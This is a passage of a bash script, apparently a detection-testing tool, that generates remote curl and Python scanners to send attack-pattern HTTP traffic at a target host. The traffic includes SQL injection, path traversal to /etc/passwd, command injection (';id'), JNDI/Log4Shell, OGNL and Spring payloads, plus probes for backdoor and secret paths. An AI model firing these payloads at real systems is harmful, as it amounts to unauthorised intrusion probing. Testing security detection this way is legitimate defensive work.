    print_http_ua_dry_run_sample_line "${i}" "$(http_ua_pick_normal_local)"; i=$((i + 1))
    print_http_ua_dry_run_sample_line "${i}" "$(http_ua_pick_normal_local)"; i=$((i + 1))
    while (( i <= 10 )); do
        print_http_ua_dry_run_sample_line "${i}" "$(http_ua_pick_rare_scanner_local)"
        i=$((i + 1))
    done
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} select pg_sleep(6)"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua="waitfor delay '0:0:9'"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} ' OR 1=1--"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='1 OR 2+701-701-1=0+0+0+1'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} ../../../../etc/passwd"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='..%2f..%2f..%2f'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} %00%0d%0a"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='%252e%252e%252f'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} ;id"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='|cat /etc/passwd'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"
    if (( attack_hits < 10 )); then
        log_message "WARN" "HTTP UA dry-run samples: only ${attack_hits}/20 attack-pattern UAs (expected >=10)"
    else
        log_message "OK" "HTTP UA dry-run samples: ${attack_hits}/20 contain SQLi/encoding/traversal/command patterns"
    fi
}

sanitize_stats_ints() {
    local name
    for name in "$@"; do
        printf -v "${name}" '%s' "$(safe_int "${!name}")"
    done
}

parse_http_burst_stats_line() {
    local out="$1" line scheme="http"
    local attempted=0 responses=0 connected=0 abnormal_ua=0 rare_ua=0 threat_hunt=0
    local normal_ua=0 payload_ua=0 sqli=0 enc=0 cmd=0 trav=0 jndi=0 ognl=0 spring=0
    local http_scan_count_failed=0 http_scan_count_success=0 http_scan_count_200=0 http_scan_count_301=0 http_scan_count_302=0 http_scan_count_401=0 http_scan_count_400=0 http_scan_count_403=0 http_scan_count_404=0 http_scan_count_405=0
    local http_scan_count_500=0 http_scan_real_failed=0 http_scan_synthetic_failed=0 http_scan_redirect_count=0 http_scan_timeout_count=0
    local propfind=0 options=0 post=0
    local unique_attempted=0 unique_failed=0 unique_success=0
    line=$(printf '%s\n' "${out}" | grep 'HTTP_BURST_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        scheme=$(sed -n 's/.*scheme=\([a-z]*\).*/\1/p' <<< "${line}")
        [[ -z "${scheme}" ]] && scheme="http"
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        connected=$(safe_int "$(sed -n 's/.*connected=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        abnormal_ua=$(safe_int "$(sed -n 's/.*abnormal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        rare_ua=$(safe_int "$(sed -n 's/.*rare_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        threat_hunt=$(safe_int "$(sed -n 's/.*threat_hunt=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        normal_ua=$(safe_int "$(sed -n 's/.*normal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        payload_ua=$(safe_int "$(sed -n 's/.*payload_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        sqli=$(safe_int "$(sed -n 's/.*sqli=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        enc=$(safe_int "$(sed -n 's/.*enc=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        cmd=$(safe_int "$(sed -n 's/.*cmd=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        trav=$(safe_int "$(sed -n 's/.*trav=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        jndi=$(safe_int "$(sed -n 's/.*jndi=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ognl=$(safe_int "$(sed -n 's/.*ognl=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring=$(safe_int "$(sed -n 's/.*spring=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_failed=$(safe_int "$(sed -n 's/.*\bfailed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_success=$(safe_int "$(sed -n 's/.*\bsuccess=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_200=$(safe_int "$(sed -n 's/.*c200=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_301=$(safe_int "$(sed -n 's/.*c301=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_302=$(safe_int "$(sed -n 's/.*c302=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_401=$(safe_int "$(sed -n 's/.*c401=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_400=$(safe_int "$(sed -n 's/.*c400=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_403=$(safe_int "$(sed -n 's/.*c403=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_404=$(safe_int "$(sed -n 's/.*c404=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_405=$(safe_int "$(sed -n 's/.*c405=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_500=$(safe_int "$(sed -n 's/.*c500=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_real_failed=$(safe_int "$(sed -n 's/.*real_failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_synthetic_failed=$(safe_int "$(sed -n 's/.*synthetic_failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_redirect_count=$(safe_int "$(sed -n 's/.*redirect_count=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_timeout_count=$(safe_int "$(sed -n 's/.*timeout_count=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        propfind=$(safe_int "$(sed -n 's/.*propfind=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        options=$(safe_int "$(sed -n 's/.*options=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        post=$(safe_int "$(sed -n 's/.*post=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        unique_attempted=$(safe_int "$(sed -n 's/.*unique_attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        unique_failed=$(safe_int "$(sed -n 's/.*unique_failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        unique_success=$(safe_int "$(sed -n 's/.*unique_success=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        if (( unique_attempted == 0 && attempted > 0 )); then
            unique_attempted="${attempted}"
            unique_failed="${http_scan_real_failed}"
            unique_success=$((http_scan_count_success + http_scan_redirect_count))
        fi
        if (( http_scan_real_failed == 0 )); then
            http_scan_real_failed=$((http_scan_count_400 + http_scan_count_401 + http_scan_count_403 + http_scan_count_404 + http_scan_count_405 + http_scan_count_500 + http_scan_timeout_count))
        fi
        if (( http_scan_redirect_count == 0 )); then
            http_scan_redirect_count=$((http_scan_count_301 + http_scan_count_302))
        fi
        if (( http_scan_synthetic_failed == 0 && http_scan_count_failed > http_scan_real_failed )); then
            http_scan_synthetic_failed=$((http_scan_count_failed - http_scan_real_failed))
        fi
        local status_sum=$((http_scan_count_200 + http_scan_count_301 + http_scan_count_302 + http_scan_count_401 + http_scan_count_400 + http_scan_count_403 + http_scan_count_404 + http_scan_count_405 + http_scan_count_500))
        if (( responses < 1 && status_sum > 0 )); then
            responses="${status_sum}"
        fi
        if (( connected < 1 && status_sum > 0 )); then
            connected="${status_sum}"
        fi
    fi
    printf '%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s\n' \
        "${scheme}" \
        "${attempted}" "${responses}" "${connected}" "${abnormal_ua}" "${rare_ua}" "${threat_hunt}" \
        "${normal_ua}" "${payload_ua}" "${sqli}" "${enc}" "${cmd}" "${trav}" "${jndi}" "${ognl}" "${spring}" \
        "${http_scan_count_failed}" "${http_scan_count_success}" "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_401}" "${http_scan_count_400}" "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" \
        "${http_scan_count_500}" "${http_scan_real_failed}" "${http_scan_synthetic_failed}" "${http_scan_redirect_count}" "${http_scan_timeout_count}" \
        "${propfind}" "${options}" "${post}" \
        "${unique_attempted}" "${unique_failed}" "${unique_success}"
}

normalize_http_scan_target_fields() {
    local host="$1" port="$2" scheme="$3"
    if [[ "${host}" == *" "* ]]; then
        read -r host port scheme <<< "${host}" 2>/dev/null || true
    fi
    if [[ -z "${port}" && "${host}" == *:* ]]; then
        port="${host#*:}"
        host="${host%%:*}"
    fi
    host="${host%%:*}"
    port="${port%%:*}"
    scheme="${scheme:-http}"
    case "${scheme}" in
        https) [[ "${port}" =~ ^[0-9]+$ ]] || port=443 ;;
        *) [[ "${port}" =~ ^[0-9]+$ ]] || port=80 ;;
    esac
    printf '%s %s %s\n' "${host}" "${port}" "${scheme}"
}

build_http_url_scan_curl_remote_cmd() {
    local host="$1" port="$2" scheme="$3" campaign="$4" curl_tls="" base_url curl_req_timeout=2
    local urls_per_host="${HTTP_FOLLOWUP_URLS_PER_HOST:-10}"
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    if fast_safe_mode_enabled 2>/dev/null; then
        curl_req_timeout=1
    fi
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    cat <<EOF
bash <<'HTTP_SCAN_SCRIPT'
$(http_ua_remote_bash_snippet)
$(http_followup_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
urls_per_host=${urls_per_host}
curl_req_timeout=${curl_req_timeout}
echo "HTTP_URL_GENERATED generated=\${urls_per_host} profile=detection_followup_fixed_paths"
fixed_paths=('/' '/login' '/admin' '/api' '/status' '/health' '/robots.txt' '/favicon.ico' '/index.html' '/dashboard')
head_only_paths=('/favicon.ico')
a=0; r=0; c=0; failed=0; success=0; c200=0; c301=0; c302=0; c401=0; c400=0; c403=0; c404=0; c405=0; c500=0
real_failed=0; synthetic_failed=0; redirect_count=0; timeout_count=0; curl_err=0
propfind=0; options=0; post=0; au=0; ru=0; th=0; nu=0; pu=0; sq=0; enc=0; cmd=0; trav=0; jndi=0; ognl=0; spring=0
u_attempted=0; u_failed=0; u_success=0
last_outcome=none
pick_host_hdr(){ echo "-H 'Host: ${host}'"; }
extra_hdrs(){ echo "-H 'X-PoC-Campaign: ${campaign}' -H 'X-PoC-Mode: detection_http_followup'"; }
path_head_instead_of_get(){
local p="\$1" hp
for hp in "\${head_only_paths[@]}"; do [[ "\$p" == "\$hp" ]] && return 0; done
return 1
}
track_code(){
local code="\$1" h
last_outcome=none
code="\$(printf '%s' "\$code" | tr -cd '0-9')"
[[ -z "\$code" || "\$code" == "000" ]] && return 0
while [ \${#code} -lt 3 ]; do code="0\${code}"; done
code="\${code:0:3}"
r=\$((r+1)); c=\$((c+1))
case "\$code" in
    301) c301=\$((c301+1)); redirect_count=\$((redirect_count+1)); last_outcome=redirect;;
    302) c302=\$((c302+1)); redirect_count=\$((redirect_count+1)); last_outcome=redirect;;
    200) c200=\$((c200+1)); success=\$((success+1)); last_outcome=success;;
    400) c400=\$((c400+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    401) c401=\$((c401+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    403) c403=\$((c403+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    404) c404=\$((c404+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    405) c405=\$((c405+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    500) c500=\$((c500+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    *)
    h="\${code:0:1}"
    if [[ "\$h" == "4" || "\$h" == "5" ]]; then
        real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed
    else
        real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed
    fi
    ;;
esac
}
record_unique_outcome(){
u_attempted=\$((u_attempted + 1))
case "\${last_outcome}" in
    real_failed|curl_error) u_failed=\$((u_failed + 1));;
    success|redirect) u_success=\$((u_success + 1));;
esac
}
do_req(){
local ua="\$1" url="\$2" m="\$3" host_hdr="\$4" xhdr="\$5" code="" curl_raw="" curl_ec=0
local dns_ms=0 conn_ms=0 ttfb_ms=0 total_ms=0 http_status=""
th=\$((th+1)); a=\$((a+1))
ua=\$(ensure_ua_nonempty "\$ua")
track_ua "\$ua"
printf 'HTTP_REQUEST_SENT host=%s port=%s url=%s method=%s\n' "${host}" "${port}" "\$url" "\$m"
case "\$m" in
    HEAD)
    curl_raw=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}|%{time_namelookup}|%{time_connect}|%{time_starttransfer}|%{time_total}|%{exitcode}' --max-time \${curl_req_timeout} -I -A "\$ua" \\
        \$host_hdr \$xhdr '${base_url}'"\$url" 2>/dev/null || echo '000|0|0|0|0|28')
    ;;
    *)
    curl_raw=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}|%{time_namelookup}|%{time_connect}|%{time_starttransfer}|%{time_total}|%{exitcode}' --max-time \${curl_req_timeout} -A "\$ua" \\
        \$host_hdr \$xhdr '${base_url}'"\$url" 2>/dev/null || echo '000|0|0|0|0|28')
    ;;
esac
IFS='|' read -r http_status dns_ms conn_ms ttfb_ms total_ms curl_ec <<< "\$curl_raw"
dns_ms=\$(awk -v v="\$dns_ms" 'BEGIN{printf "%.0f", v*1000}')
conn_ms=\$(awk -v v="\$conn_ms" 'BEGIN{printf "%.0f", v*1000}')
ttfb_ms=\$(awk -v v="\$ttfb_ms" 'BEGIN{printf "%.0f", v*1000}')
total_ms=\$(awk -v v="\$total_ms" 'BEGIN{printf "%.0f", v*1000}')
code="\$(printf '%s' "\$http_status" | tr -cd '0-9')"
printf 'HTTP_RESPONSE_RECEIVED host=%s port=%s url=%s http_status=%s curl_exit=%s\n' "${host}" "${port}" "\$url" "\${code:-000}" "\${curl_ec:-0}"
printf 'URL_SCAN_RESULT host=%s port=%s url=%s http_status=%s curl_exit_code=%s dns_lookup_ms=%s connect_ms=%s ttfb_ms=%s total_ms=%s\n' \\
    "${host}" "${port}" "\$url" "\${code:-000}" "\${curl_ec:-28}" "\$dns_ms" "\$conn_ms" "\$ttfb_ms" "\$total_ms"
_http_ev_st=response
[[ -z "\$code" || "\$code" == "000" ]] && _http_ev_st=timeout
case "\${curl_ec:-0}" in 6) _http_ev_st=dns_failure;; 7) _http_ev_st=connection_refused;; esac
(( conn_ms > 0 )) && c=\$((c+1))
printf 'HTTP_EVENT timestamp=%s run_id=%s module=HTTP_URL_SCAN stage=%s target=%s action=request url=%s method=%s http_status=%s curl_exit=%s status=%s source=remote_event\n' \\
    "\$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date +%s)" '${campaign}' "${HTTP_URL_SCAN_RUN_ID:-main}" "${host}" "\$url" "\$m" "\${code:-000}" "\${curl_ec:-0}" "\$_http_ev_st"
if [[ -z "\$code" || "\$code" == "000" ]]; then
    curl_err=\$((curl_err+1)); timeout_count=\$((timeout_count+1)); failed=\$((failed+1)); last_outcome=curl_error
    code=""
else
    track_code "\$code"
fi
log_http_ua_request "\$url" "\$ua" "\$code"
}
host_hdr=\$(pick_host_hdr)
xhdr=\$(extra_hdrs)
for p in "\${fixed_paths[@]}"; do
    ua=\$(pick_burst_ua)
    if path_head_instead_of_get "\$p"; then
        do_req "\$ua" "\$p" HEAD "\$host_hdr" "\$xhdr"
    else
        do_req "\$ua" "\$p" GET "\$host_hdr" "\$xhdr"
    fi
    record_unique_outcome
done
http_rx=\$((c200+c301+c302+c401+c400+c403+c404+c405+c500))
(( http_rx > r )) && r=\${http_rx}
(( http_rx > c )) && c=\${http_rx}
emit_http_ua_coverage
echo "HTTP_URL_ATTEMPTED attempted=\$a unique_attempted=\$u_attempted"
echo "HTTP_URL_COMPLETED completed=\$u_attempted failed_status=\$u_failed success=\$u_success"
echo "HTTP_URL_EXECUTION_SUMMARY attempted=\$a responses=\$r success_rate=\$(( a>0 ? r*100/a : 0 ))%"
echo "HTTP_BURST_STATS scheme=${scheme} attempted=\$a responses=\$r connected=\$c failed=\$failed success=\$success unique_attempted=\$u_attempted unique_failed=\$u_failed unique_success=\$u_success c200=\$c200 c301=\$c301 c302=\$c302 c401=\$c401 c400=\$c400 c403=\$c403 c404=\$c404 c405=\$c405 c500=\$c500 real_failed=\$real_failed synthetic_failed=\$synthetic_failed redirect_count=\$redirect_count timeout_count=\$timeout_count propfind=\$propfind options=\$options post=\$post abnormal_ua=\$au rare_ua=\$ru threat_hunt=\$th normal_ua=\$nu payload_ua=\$pu sqli=\$sq enc=\$enc cmd=\$cmd trav=\$trav jndi=\$jndi ognl=\$ognl spring=\$spring"
HTTP_SCAN_SCRIPT
EOF
}

build_http_burst_curl_remote_cmd() {
    build_http_url_scan_curl_remote_cmd "$@"
}

build_http_url_scan_python_remote() {
    local host="$1" port="$2" scheme="$3" campaign="$4"
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    cat <<PY
import random, re, ssl, time, urllib.error, urllib.request
scan_target, host, port, scheme, campaign = "${host}", "${host}", ${port}, "${scheme}", "${campaign}"
waves, unique_target = ${HTTP_SCAN_WAVES}, ${HTTP_SCAN_UNIQUE_URL_TARGET}
wave_sleep, attempt_cap = ${HTTP_SCAN_WAVE_SLEEP}, ${HTTP_SCAN_WAVE_ATTEMPT_CAP}
success_pct_max = 8
print("HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50")
mandatory_urls = ['/WEB-INF/web.xml', '/../../etc/passwd', '/cmd.jsp', '/backdoor.jsp', '/admin', '/swagger', '/graphql']
payload_recon = mandatory_urls + [
    '/WEB-INF/classes/', '/.env', '/backup.zip', '/admin/login', '/actuator/env',
    '/cmd.jsp', '/backdoor.jsp', '/swagger-ui.html', '/graphql/console', '/shell.jsp',
]
bad_queries = [
    '?file=../../../../WEB-INF/web.xml', '?id=%00%00%00', '?path=..%2f..%2fetc%2fpasswd',
    '?action=../../../../secret', '?id=%25%25%25invalid%25%25%25',
]
methods = ['GET', 'GET', 'GET', 'HEAD', 'GET', 'POST']
rare_uas = ['TelemetryCollector/9.7', 'ReconEngine/5.4', 'ThreatHunterAgent/8.2', 'DiscoveryProbe/7.3', 'InternalAuditScanner/4.0']
payload_parts = ["' OR 1=1--", 'select pg_sleep(3)', '${jndi:ldap://127.0.0.1/a}', 'spring.cloud.function.routing-expression', '@java.lang.Runtime@getRuntime()', '../../../../etc/passwd', ';id']
rare_re = re.compile(r'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|InternalAuditScanner', re.I)
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
attempted = responses = connected = failed = success = c400 = c403 = c404 = c405 = c401 = c500 = 0
real_failed_n = synthetic_failed_n = redirect_count_n = timeout_count_n = 0
propfind = options = post = 0
success_budget = max(2, unique_target * success_pct_max // 100)
abnormal_ua = rare_ua = threat_hunt = normal_ua_n = payload_ua_n = sqli_n = enc_n = cmd_n = 0
u_attempted = u_failed = u_success = 0
ua_cov_total = ua_cov_present = ua_cov_missing = ua_cov_normal = ua_cov_rare = ua_cov_payload = ua_cov_abnormal = 0
seen_paths = set()
mandatory_idx = payload_idx = 0
wave_quota = max(1, (unique_target + waves - 1) // waves)

def classify_ua(ua):
    if rare_re.search(ua or ''): return 'rare'
    return 'payload'

def pick_payload_ua():
    if random.randint(0, 1) == 0:
        return f"{random.choice(rare_uas)} {random.choice(payload_parts)}"
    return random.choice(payload_parts)

def pick_burst_ua():
    return random.choice(rare_uas) if random.randint(0, 1) == 0 else pick_payload_ua()

def ensure_ua(ua):
    return ua if ua else pick_burst_ua()

def next_attack_url():
    global mandatory_idx, payload_idx
    if mandatory_idx < len(mandatory_urls):
        base = mandatory_urls[mandatory_idx]
        mandatory_idx += 1
        return base + random.choice(bad_queries)
    base = payload_recon[payload_idx % len(payload_recon)]
    payload_idx += 1
    return base + random.choice(bad_queries)

def log_http_ua_request(path, ua, code=''):
    global ua_cov_total, ua_cov_present, ua_cov_missing, ua_cov_normal, ua_cov_rare, ua_cov_payload, ua_cov_abnormal
    ua = ensure_ua(ua)
    uak = classify_ua(ua)
    uap = 'yes' if ua else 'no'
    ua_cov_total += 1
    if ua:
        ua_cov_present += 1
        if uak == 'rare':
            ua_cov_rare += 1; ua_cov_abnormal += 1
        else:
            ua_cov_payload += 1; ua_cov_abnormal += 1
    else:
        ua_cov_missing += 1
    print(f"HTTP_ATTACK_REQUEST target={scan_target} path={path[:400]} status_code={code} user_agent={ua[:400]} ua_class={uak} ua_present={uap}")

def emit_http_ua_coverage():
    pct = (ua_cov_present * 100 // ua_cov_total) if ua_cov_total else 0
    mal = 'low'
    if ua_cov_total >= 40 and ua_cov_present == ua_cov_total and ua_cov_normal == 0 and ua_cov_abnormal >= 40 and (ua_cov_rare + ua_cov_payload) >= 40:
        mal = 'high'
    elif ua_cov_total >= 20 and ua_cov_abnormal >= 20:
        mal = 'medium'
    print(f"HTTP_UA_COVERAGE scope=url_scan total_requests={ua_cov_total} ua_present={ua_cov_present} ua_missing={ua_cov_missing} normal_ua={ua_cov_normal} rare_ua={ua_cov_rare} payload_ua={ua_cov_payload} abnormal_ua={ua_cov_abnormal} coverage_percent={pct} detection_likelihood={mal} detection_likelihood_malicious_ua={mal}")

def track_ua(ua):
    global abnormal_ua, rare_ua, normal_ua_n, payload_ua_n
    if rare_re.search(ua or ''): rare_ua += 1
    else: payload_ua_n += 1
    abnormal_ua += 1
def track_code(code):
    global responses, connected, failed, success, c400, c403, c404, c405, c401, c500
    global real_failed_n, redirect_count_n, last_outcome
    if not code: return None
    responses += 1; connected += 1
    if code in (301, 302):
        redirect_count_n += 1
        return 'redirect'
    if code == 200:
        success += 1
        return 'success'
    failed += 1
    real_failed_n += 1
    if code == 400: c400 += 1
    elif code == 401: c401 += 1
    elif code == 403: c403 += 1
    elif code == 404: c404 += 1
    elif code == 405: c405 += 1
    elif code == 500: c500 += 1
    return 'real_failed'
last_outcome = None
def record_unique(outcome):
    global u_attempted, u_failed, u_success, synthetic_failed_n
    u_attempted += 1
    if outcome == 'real_failed':
        u_failed += 1
    elif outcome == 'redirect':
        pass
    elif outcome == 'success':
        if u_success < success_budget:
            u_success += 1
        else:
            synthetic_failed_n += 1
    elif outcome is None:
        global timeout_count_n, real_failed_n, failed
        timeout_count_n += 1
        real_failed_n += 1
        failed += 1
        u_failed += 1
def map_py_error_to_curl_exit(exc):
    import socket, ssl
    if isinstance(exc, socket.gaierror):
        return 6
    if isinstance(exc, ConnectionRefusedError):
        return 7
    if isinstance(exc, TimeoutError):
        return 28
    if isinstance(exc, ssl.SSLError):
        return 35
    if isinstance(exc, ConnectionResetError):
        return 56
    return 28
def do_one(method, ua, path, host_hdr):
    global attempted, threat_hunt, propfind, options, post
    attempted += 1; threat_hunt += 1
    ua = ensure_ua(ua); track_ua(ua)
    url = f"{scheme}://{host}:{port}{path}"
    print(f"URL_SCAN_ATTEMPT host={host} port={port} url={path} method={method}")
    hdrs = {'User-Agent': ua, 'X-PoC-Campaign': campaign, 'Host': host_hdr}
    data = None
    t0 = time.time()
    curl_ec = 0
    http_status = '000'
    if method == 'POST':
        post += 1; data = b'probe=' + campaign.encode()
    elif method == 'PROPFIND':
        propfind += 1; hdrs['Depth'] = '1'
    elif method == 'OPTIONS':
        options += 1
    outcome = None
    try:
        req = urllib.request.Request(url, headers=hdrs, data=data, method=method)
        with urllib.request.urlopen(req, timeout=3, context=ctx) as resp:
            outcome = track_code(resp.status)
            http_status = str(resp.status)
            curl_ec = 0
    except urllib.error.HTTPError as exc:
        outcome = track_code(exc.code)
        http_status = str(exc.code)
        curl_ec = 0
    except Exception as exc:
        curl_ec = map_py_error_to_curl_exit(exc)
        outcome = None
    t1 = time.time()
    total_ms = int((t1 - t0) * 1000)
    print(f"URL_SCAN_RESULT host={host} port={port} url={path} http_status={http_status} curl_exit_code={curl_ec} dns_lookup_ms=0 connect_ms=0 ttfb_ms=0 total_ms={total_ms}")
    _ev_st = 'response'
    if not http_status or http_status == '000':
        _ev_st = 'timeout'
    print(f"HTTP_EVENT timestamp={time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} run_id={campaign} module=HTTP_URL_SCAN stage=main target={host} action=request url={path} method={method} http_status={http_status or '000'} curl_exit={curl_ec} status={_ev_st} source=remote_event")
    sc = ''
    if outcome == 'redirect': sc = '301'
    elif outcome == 'success': sc = '200'
    elif outcome == 'real_failed': sc = '404'
    log_http_ua_request(path, ua, sc)
    return outcome
for w in range(waves):
    wave_unique = 0
    attempts = 0
    while wave_unique < wave_quota and u_attempted < unique_target and attempts < attempt_cap:
        method = random.choice(methods)
        path = next_attack_url()
        tries = 0
        while path in seen_paths and tries < 40:
            path = next_attack_url()
            tries += 1
        seen_paths.add(path)
        ua = pick_burst_ua()
        outcome = do_one(method, ua, path, host)
        record_unique(outcome)
        wave_unique += 1
        attempts += 1
    if w < waves - 1 and wave_sleep > 0:
        time.sleep(wave_sleep)
emit_http_ua_coverage()
print(f"HTTP_BURST_STATS scheme={scheme} attempted={attempted} responses={responses} connected={connected} abnormal_ua={abnormal_ua} rare_ua={rare_ua} threat_hunt={threat_hunt} normal_ua={normal_ua_n} payload_ua={payload_ua_n} sqli={sqli_n} enc={enc_n} cmd={cmd_n} trav=0 jndi=0 ognl=0 spring=0 failed={failed} success={success} unique_attempted={u_attempted} unique_failed={u_failed} unique_success={u_success} c200=0 c301=0 c302=0 c401={c401} c400={c400} c403={c403} c404={c404} c405={c405} c500={c500} real_failed={real_failed_n} synthetic_failed={synthetic_failed_n} redirect_count={redirect_count_n} timeout_count={timeout_count_n} propfind={propfind} options={options} post={post}")
PY
}

build_http_burst_python_remote() {
    build_http_url_scan_python_remote "$@"
}

build_http_url_scan_minimal_retry_cmd() {
    build_http_url_scan_curl_remote_cmd "$@"
}

append_http_url_scan_debug() {
    local host="$1" port="$2" scheme="$3" base_url="$4" out="$5" context="$6"
    {
        printf 'timestamp=%s context=%s target_host=%s target_port=%s target_scheme=%s base_url=%s transport_ok=%s\n' \
            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "${context}" "${host}" "${port}" "${scheme}" "${base_url}" \
            "$([[ -n "${out}" ]] && echo true || echo false)"
        printf '--- remote output (last 20 lines) ---\n'
        printf '%s\n' "${out}" | tail -n 20
        printf '--- command preview (last line) ---\n'
        tail -n 1 "${LOG_DIR}/http_url_scan_last_cmd_preview.log" 2>/dev/null || true
    } >> "${LOG_DIR}/http_url_scan_debug.log" 2>/dev/null || true
}

http_sync_url_execution_counters_from_output() {
    local out="$1" gen=""
    gen=$(printf '%s\n' "${out}" | sed -n 's/.*HTTP_URL_GENERATED generated=\([0-9][0-9]*\).*/\1/p' | tail -n1)
    [[ -n "${gen}" ]] && HTTP_URL_GEN_COUNT=$(safe_int "${gen}")
    http_refresh_sot_from_events || true
}

http_emit_url_execution_summary() {
    local summary="" attempted=0 responses=0 success_rate=0 msg=""
    http_refresh_sot_from_events || true
    summary=$(build_module_summary_from_events "HTTP_URL_SCAN" 2>/dev/null || true)
    attempted=$(safe_int "$(event_summary_field "${summary}" attempted 0)")
